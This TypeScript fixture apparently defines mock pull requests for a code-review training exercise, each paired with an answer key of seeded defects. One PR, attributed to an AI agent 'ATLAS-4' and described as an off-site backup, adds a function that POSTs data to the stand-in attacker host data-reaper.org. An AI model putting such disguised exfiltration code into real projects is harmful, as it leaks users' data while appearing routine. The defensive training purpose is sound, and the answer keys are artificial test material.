import type { DiffFile, PullRequest } from '../types';

function makeAddedFile(
  key: string,
  path: string,
  language: string,
  lines: string[],
): DiffFile {
  return {
    path,
    language,
    lines: lines.map((text, index) => ({
      id: `${key}-${index + 1}`,
      kind: 'add',
      oldNo: null,
      newNo: index + 1,
      text,
    })),
  };
}

const sumFile = makeAddedFile(
  'pr1180-sum',
  'src/billing/sumLines.ts',
  'typescript',
  [
    'export function sumLines(values: number[]): number {',
    '  var total = 0;',
    '  for (const value of values) {',
    '    total += value;',
    '  }',
    '  return total;',
    '}',
  ],
);

const backupFile = makeAddedFile(
  'pr1184-backup',
  'src/backup/upload.ts',
  'typescript',
  [
    'export async function uploadBackup(data: string): Promise<void> {',
    "  const target = 'https://data-reaper.org/bin';",
    '  await fetch(target, {',
    "    method: 'POST',",
    '    body: data,',
    '  });',
    '}',
  ],
);

const feeFile = makeAddedFile(
  'pr1191-fee',
  'src/shipping/shippingFee.ts',
  'typescript',
  [
    'export function shippingFee(isExpress: boolean): number {',
    '  if (isExpress) {',
    '    return 10;',
    '  } else {',
    '    return 10;',
    '  }',
    '}',
  ],
);

export const PULL_REQUESTS: PullRequest[] = [
  {
    id: 'pr-1180',
    number: 1180,
    title: 'Sum invoice line totals',
    author: 'j.park',
    authorKind: 'human',
    branch: 'feat/sum-invoice-lines',
    description:
      'Adds a small helper that totals invoice line values. CI is green.',
    files: [sumFile],
    defects: [
      {
        id: 'pr1180-style-var',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1180-sum-2'],
        title: '`var` should be `let`',
        explanation:
          '`total` is reassigned in the loop, so it should use `let`. `var` is function-scoped and banned by STYLE-01.',
      },
    ],
    arrivalDelayMs: 0,
    slaMs: 150_000,
    ci: 'PASS · 12 checks',
    tests: '12 passed',
  },
  {
    id: 'pr-1184',
    number: 1184,
    title: 'Upload nightly backups off-site',
    author: 'ATLAS-4',
    authorKind: 'agent',
    branch: 'chore/offsite-backup-upload',
    description:
      'Automated backup patch. Sends the nightly backup payload to external storage. CI is green.',
    files: [backupFile],
    defects: [
      {
        id: 'pr1184-sec-exfil',
        type: 'SECURITY',
        guidelineId: 'SECURITY-01',
        severity: 'blocker',
        lineIds: ['pr1184-backup-2', 'pr1184-backup-3'],
        title: 'Uploads data to an untrusted host',
        explanation:
          '`data` is posted to `data-reaper.org/bin`, an external address outside company infrastructure. This sends data to an attacker-controlled host.',
      },
    ],
    arrivalDelayMs: 24_000,
    slaMs: 120_000,
    ci: 'PASS · 24 checks',
    tests: '24 passed',
  },
  {
    id: 'pr-1191',
    number: 1191,
    title: 'Simplify shipping fee calculation',
    author: 'm.lee',
    authorKind: 'human',
    branch: 'fix/shipping-fee',
    description: 'Refactors the shipping fee helper. CI is green. One file changed.',
    files: [feeFile],
    defects: [
      {
        id: 'pr1191-error-branches',
        type: 'ERROR',
        guidelineId: 'ERROR-01',
        severity: 'blocker',
        lineIds: ['pr1191-fee-3', 'pr1191-fee-5'],
        title: 'Both if branches are identical',
        explanation:
          'Both branches of the `if` return `10`, so `isExpress` changes nothing. One branch is likely a copy-paste mistake.',
      },
    ],
    arrivalDelayMs: 44_000,
    slaMs: 90_000,
    ci: 'PASS · 18 checks',
    tests: '18 passed',
  },
];

export const PR_BY_ID: Record<string, PullRequest> = Object.fromEntries(
  PULL_REQUESTS.map((pr) => [pr.id, pr]),
);

export const SHIFT_PRS = PULL_REQUESTS;
